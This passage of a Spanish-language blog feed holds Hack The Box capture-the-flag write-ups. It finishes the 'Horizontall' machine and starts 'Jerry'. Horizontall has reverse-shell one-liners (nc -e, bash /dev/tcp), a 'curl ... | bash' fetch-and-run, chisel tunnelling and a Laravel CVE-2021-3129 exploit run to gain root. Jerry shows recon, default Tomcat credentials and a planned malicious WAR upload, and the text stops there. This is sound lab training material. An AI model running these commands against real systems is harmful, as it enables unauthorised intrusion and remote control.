&lt;p&gt;Le pasamos la URL.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-03-33.png&quot; alt=&quot;Hackforce-2022-12-12-01-03-33.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y como podemos ver nos funciono el exploit.&lt;/p&gt;

&lt;p&gt;Ahora probaremos entablarnos una reverse shell.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; /bin/bash 10.10.14.7 443
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-10-06.png&quot; alt=&quot;Hackforce-2022-12-12-01-10-06.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que no al parecer no nos interpreta, hacemos un par de pruebas mas.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /de/tcp/10.10.14.7/443 0&amp;gt;&amp;amp;1
bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /de/tcp/10.10.14.7/443 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;%26 /de/tcp/10.10.14.7/443 0&amp;gt;%261&lt;span class=&quot;s2&quot;&gt;&quot;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Probamos con cada una y vemos que no funciona entonces verificamos que la maquina tenga curl.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Curl http://10.10.14.7/test
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y también nos montamos el servidor con python en nuestra maquina.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-16-05.png&quot; alt=&quot;Hackforce-2022-12-12-01-16-05.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Y vemos que si tiene curl instalado la maquina victima.&lt;/p&gt;

&lt;p&gt;Lo que haremos sera crearnos un archivo index.html con el siguiente contenido.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nvim index.html
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-43-37.png&quot; alt=&quot;Hackforce-2022-12-12-01-43-37.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Nos montamos el servidor con python para compartirnos el recurso index.html.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora hacemos un curl al recurso que compartimos, veremos que nos muestra el código del index.html si lo pipeamos con bash nos va a interpretar el código, antes de lanzarle el curl nos ponemos en escucha con netcat.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl http://10.10.14.7/index.html | bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-45-04.png&quot; alt=&quot;Hackforce-2022-12-12-01-45-04.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Una vez lanzado el curl podemos ver que hemos obtenido una reverse shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-49-08.png&quot; alt=&quot;Hackforce-2022-12-12-01-49-08.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Hacemos un locate del user.txt&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;locate user.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-01-57-41.png&quot; alt=&quot;Hackforce-2022-12-12-01-57-41.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos donde esta la flag y hacemos un cat para ver si logramos visualizarla.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/user.png&quot; alt=&quot;Hackforce-2022-12-12-01-58-44.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;En efecto visualizamos la flag con eso ya tendríamos la maquina ahora nos falta convertirnos en root.&lt;/p&gt;

&lt;p&gt;Antes de escalar priveligios haremos el tratamiento de la TTY.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;script /dev/null &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; bash
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-14-16.png&quot; alt=&quot;Hackforce-2022-12-12-02-14-16.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;ctrl + z y continuamos con el tratamiento.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;stty &lt;/span&gt;raw &lt;span class=&quot;nt&quot;&gt;-echo&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;fg
&lt;/span&gt;reset
xterm
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-16-30.png&quot; alt=&quot;Hackforce-2022-12-12-02-16-30.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Continuamos&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;TERM&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;xterm
&lt;span class=&quot;nb&quot;&gt;export &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;SHELL&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;bash
ssty rows 37 columns 183
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;En el caso de el size de la stty tienen que colocar la de las proporciones de su ventana y ya con esto tendriamos total movilidad en la shell.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-20-33.png&quot; alt=&quot;Hackforce-2022-12-12-02-20-33.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora si pasamos a la escalada.&lt;/p&gt;

&lt;h1 id=&quot;escalada-de-privilegios&quot;&gt;Escalada de Privilegios&lt;/h1&gt;

&lt;p&gt;Lo primero que haremos sera buscar por permisos SUID nos dirigimos a la raiz y ejecutamos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;find &lt;span class=&quot;se&quot;&gt;\-&lt;/span&gt;perm &lt;span class=&quot;nt&quot;&gt;-4000&lt;/span&gt; 2&amp;gt;/dev/null
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-28-37.png&quot; alt=&quot;Hackforce-2022-12-12-02-28-37.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No vemos nada interesante para escalar.&lt;/p&gt;

&lt;p&gt;Luego listamos por tareas cron.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /etc/crontab
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-29-51.png&quot; alt=&quot;Hackforce-2022-12-12-02-29-51.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;No vemos ninguna tarea cron.&lt;/p&gt;

&lt;p&gt;Listamos puertos que estén abiertos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;netstat &lt;span class=&quot;nt&quot;&gt;-nat&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-31-39.png&quot; alt=&quot;Hackforce-2022-12-12-02-31-39.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos por ahi uno interesante.&lt;/p&gt;

&lt;p&gt;lanzamos un curl al puerto 8000 para ver que hay.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl localhost:8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-32-56.png&quot; alt=&quot;Hackforce-2022-12-12-02-32-56.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que hay una pagina web con laravel.&lt;/p&gt;

&lt;p&gt;Utilizaremos chisel para jugar con port forwarding. Nos dirigimos a github y nos clonamos el repositorio en exploits.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/jpillora/chisel.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos metemos en chisel y compilamos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;go build &lt;span class=&quot;nt&quot;&gt;-ldflags&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;-s -w&quot;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ahora con UPX vamos a reducir mas el peso de chisel&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upx chisel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez hecho esto nos transferiremos el chisel a la maquina victima. En nuestra maquina colocamos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y en la maquina victima nos dirigimos al directorio tmp y nos bajamos el chisel.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget http://10.10.14.7/chisel
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-45-39.png&quot; alt=&quot;Hackforce-2022-12-12-02-45-39.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Luego le damos permisos de ejecución chmod + x chisel.&lt;/p&gt;

&lt;p&gt;Ahora para utilizar chisel vamos a montarnos un servidor en nuestra maquina por el puerto que queramos.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./chisel server &lt;span class=&quot;nt&quot;&gt;--reverse&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1234
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-02-55-21.png&quot; alt=&quot;Hackforce-2022-12-12-02-55-21.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Ahora ejecutamos el chisel en la maquina victima para hacer el port forwarding.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./chisel client 10.10.14.7:1234 R:8000:127.0.0.1:8000
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-04-25.png&quot; alt=&quot;Hackforce-2022-12-12-03-04-25.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Con esto ya estaría listo el port forwarding, y lo verificamos visitando el &lt;a href=&quot;http://localhost&quot;&gt;localhost&lt;/a&gt; en el puerto indicado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-05-39.png&quot; alt=&quot;Hackforce-2022-12-12-03-05-39.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo ya podemos visualizar la pagina de laravel en nuestra maquina.&lt;/p&gt;

&lt;p&gt;Buscamos en github un exploit para esa version de laravel y nos clonamos el repositorio en exploits.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;git clone https://github.com/nth347/CVE-2021-3129_exploit.git
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos metemos al directorio y ejecutamos el script de python.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-32-43.png&quot; alt=&quot;Hackforce-2022-12-12-03-32-43.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo nos funciono ahora solo nos faltaria ejecutarnos una reverse shell para acceder como root y visualizar la flag.&lt;/p&gt;

&lt;p&gt;Como ya tenemos una via potencial para mandarnos la reverse shell con el index.html que habiamos creado lo copiamos a este directorio.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cp&lt;/span&gt; ../index.html &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luego montamos el servidor con python nuevamente.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; http.server 80
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nos ponemos en escucha con netcat.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc &lt;span class=&quot;nt&quot;&gt;-nlvp443&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Y por ultimo ejecutamos el exploit.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 exploit.py http://127.0.0.1:8000 Monolog/RCE1 &lt;span class=&quot;s1&quot;&gt;'curl 10.10.14.7 | bash'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/Hackforce-2022-12-12-03-44-27.png&quot; alt=&quot;Hackforce-2022-12-12-03-44-27.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo con esto nos convertimos en root y podemos visualizar la flag.&lt;/p&gt;

&lt;p&gt;Visualizamos la flag.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-horizontall/root.png&quot; alt=&quot;Hackforce-2022-12-12-03-49-05.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Listo con esto tendríamos hecha la maquina por completo, happy hacking.&lt;/p&gt;</content><author><name>ewor01</name></author><category term="Information Leakage" /><category term="Port Forwarding" /><category term="Strapi CMS Exploitation" /><category term="Laravel Exploitation" /><summary type="html">Horizontall es una maquina donde estaremos explotando una vulnerabilidad en un gestor de contenido llamado Strapi, luego tendremos que hacer port forwarding para poder llegar a la maquina y posteriormente lograr comprometerla gracias a una vulnerabilidad en Laravel.</summary></entry><entry><title type="html">Jerry - Hack The Box</title><link href="http://localhost:4000/jerry-hackthebox/" rel="alternate" type="text/html" title="Jerry - Hack The Box" /><published>2023-01-29T00:00:00-06:00</published><updated>2023-01-29T00:00:00-06:00</updated><id>http://localhost:4000/jerry-hackthebox</id><content type="html" xml:base="http://localhost:4000/jerry-hackthebox/">&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Jerry.png&quot; alt=&quot;Jerry.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Certificaciones a aplicar: eJPT&lt;/p&gt;

&lt;p&gt;Dificultad: Fácil&lt;/p&gt;

&lt;p&gt;Habilidades:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Information Leakage&lt;/li&gt;
  &lt;li&gt;Abusing Tomcat [Intrusion &amp;amp; Privilege Escalation]&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&quot;ip-de-la-maquina&quot;&gt;IP de la Maquina&lt;/h1&gt;

&lt;p&gt;10.10.10.95&lt;/p&gt;

&lt;h1 id=&quot;reconocimiento&quot;&gt;Reconocimiento&lt;/h1&gt;

&lt;p&gt;Identificando el sistema operativo.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whichSystem.py 10.10.10.95
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-37-24.png&quot; alt=&quot;Hackforce-2022-12-18-18-37-24.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Escaneo de los puertos y guardamos en formato grep en el ficherito allPorts.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--open&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--min-rate&lt;/span&gt; 5000 &lt;span class=&quot;nt&quot;&gt;-vvv&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-Pn&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oG&lt;/span&gt; allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-48-57.png&quot; alt=&quot;Hackforce-2022-12-18-18-48-57.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Función extractPorts.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;extractPorts allPorts
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-18-49-49.png&quot; alt=&quot;Hackforce-2022-12-18-18-49-49.png&quot; /&gt;&lt;/p&gt;

&lt;h1 id=&quot;análisis-de-vulnerabilidades&quot;&gt;Análisis de Vulnerabilidades&lt;/h1&gt;

&lt;p&gt;Buscando versiones y servicios que corren para esos puertos y lo guardamos en formato nmap en el ficherito targeted.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap &lt;span class=&quot;nt&quot;&gt;-sCV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p80&lt;/span&gt; 10.10.10.95 &lt;span class=&quot;nt&quot;&gt;-oN&lt;/span&gt; targeted
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-00-49.png&quot; alt=&quot;Hackforce-2022-12-18-19-00-49.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que estamos ante un apache tomcat y nos muestra la version.&lt;/p&gt;

&lt;p&gt;Vamos a identificar ante que nos estamos enfrentando de la siguiente manera colocamos en el navegador launchpad 4ubuntu0.5 y nos dara el siguiente resultado.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-11-18-07-31.png&quot; alt=&quot;Hackforce-2022-12-11-18-07-31.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;De esta manera vemos que estamos ante un Ubuntu Bionic.&lt;/p&gt;

&lt;p&gt;Vamos a verificar con whatweb  y a ver que nos reporta la herramienta.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.95:8080
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-03-36.png&quot; alt=&quot;Hackforce-2022-12-18-19-03-36.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos poco solo que estamos ante un Tomcat de version 7.0.88.&lt;/p&gt;

&lt;p&gt;con whatweb y el parámetro -v nos mostrara un poco mas de información y de manera mas ordenada.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;whatweb http://10.10.10.95:8080 &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt;

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-14-20.png&quot; alt=&quot;Hackforce-2022-12-18-19-14-20.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Igual no logramos ver nada en concreto a si que vamos a proceder a inspeccionar la web.&lt;/p&gt;

&lt;p&gt;Vemos que es un panel de tomcat.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-40-55.png&quot; alt=&quot;Hackforce-2022-12-18-19-40-55.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vamos a probar una ruta que suele venir siempre cuando hay un tomcat.&lt;/p&gt;

&lt;p&gt;10.10.10.95:8080/manager/html.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-43-27.png&quot; alt=&quot;Hackforce-2022-12-18-19-43-27.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Vemos que nos solicita credenciales para acceder.&lt;/p&gt;

&lt;p&gt;Como no disponemos de credenciales, lo habitual es probar las que vienen por default en la aplicación.&lt;/p&gt;

&lt;p&gt;Si ingresamos las credenciales que vienen por default nos mostrara lo siguiente.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-47-53.png&quot; alt=&quot;Hackforce-2022-12-18-19-47-53.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Si leemos detenidamente lo que nos dice, veremos que pone como se deberia configurar las credenciales de acceso y vemos 2 campos interesantes, username y password.&lt;/p&gt;

&lt;p&gt;Colocamos las credenciales que encontramos al ver el archivo anterior y probamos.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-51-20.png&quot; alt=&quot;Hackforce-2022-12-18-19-51-20.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Como vemos hemos podido ingresar, ahora observaremos detenidamente que podemos hacer.&lt;/p&gt;

&lt;p&gt;Vemos que podemos subir nuestro propio archivo war.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-19-53-30.png&quot; alt=&quot;Hackforce-2022-12-18-19-53-30.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Lo que trataremos de hacer sera subir un war malicioso para que lo podamos ejecutar desde el panel de aplicaciones.&lt;/p&gt;

&lt;h1 id=&quot;explotación&quot;&gt;Explotación&lt;/h1&gt;

&lt;p&gt;Vamos a generar un war malicioso con msfvenom.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;msfvenom &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; payloads | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;java
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/htb-writeup-jerry/Hackforce-2022-12-18-20-04-18.png&quot; alt=&quot;Hackforce-2022-12-18-20-04-18.png&quot; /&gt;&lt;/p&gt;

